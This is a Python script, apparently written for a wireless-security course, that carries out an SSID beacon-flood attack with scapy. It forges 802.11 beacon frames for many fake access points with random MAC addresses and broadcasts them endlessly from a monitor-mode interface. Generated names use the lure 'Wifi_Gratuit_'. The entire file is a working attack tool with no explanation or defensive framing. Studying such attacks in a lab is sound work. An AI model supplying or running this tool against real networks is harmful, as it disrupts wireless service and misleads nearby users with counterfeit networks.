#!/usr/bin/env python
# Authors : Axel Vallon and Robin Gaudin
# Date : 26.03.2022

from scapy.all import *
import random  
import string  
from threading import Thread
from faker import Faker

def send_beacon(ssid, mac, iface):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    beacon = Dot11Beacon(cap="ESS+privacy")
    frame = RadioTap()/dot11/beacon/essid
    sendp(frame, inter=0.1,loop=1, iface=iface, verbose=0)

if __name__ == '__main__':
    import argparse

    # free to change to your own iface
    DEFAULT_WLAN = "wlan0"
    parser = argparse.ArgumentParser(description="A python script for creating a ssid flood attack with random ssid or chosen ones")
    parser.add_argument("-f", "--file", dest="file", help="File with a ssid on each line")
    parser.add_argument("-r", "--random", dest="number", help="Number of random generated ssid", default=0)
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'", default=DEFAULT_WLAN)
    args = parser.parse_args()
    file = args.file
    iface = args.iface
    number = int(args.number)

    # if it is a file, we want to get all line of this file
    ssids = []
    if number == 0 and file:
        opened_file = open(file)
        print("You selected the following file : ", opened_file.name)
        lines = opened_file.readlines()
        for line in lines:
            ssids.append(line.strip())
    # if it is a number, we want to generate this number of ssid
    elif number > 0 and not file:
        print("You selected the creation of", number, "random ssid")
        for i in range(number):
            ssids.append('Wifi_Gratuit_' + ''.join(random.choices(string.ascii_uppercase + string.digits, k = 8)))
    else:
        print("Please fill the file or the number argument")
        exit(0)

    faker = Faker()
    print("\nAccess points created")
    for ssid in ssids:
        # we generate a new MAC for each SSID
        mac_adress = faker.mac_address()
        print("SSID :", ssid, " MAC :", mac_adress)
        # we start a thread for each ssid and they send beacons every 0,1s forever
        Thread(target=send_beacon, args=(ssid, mac_adress, iface)).start()
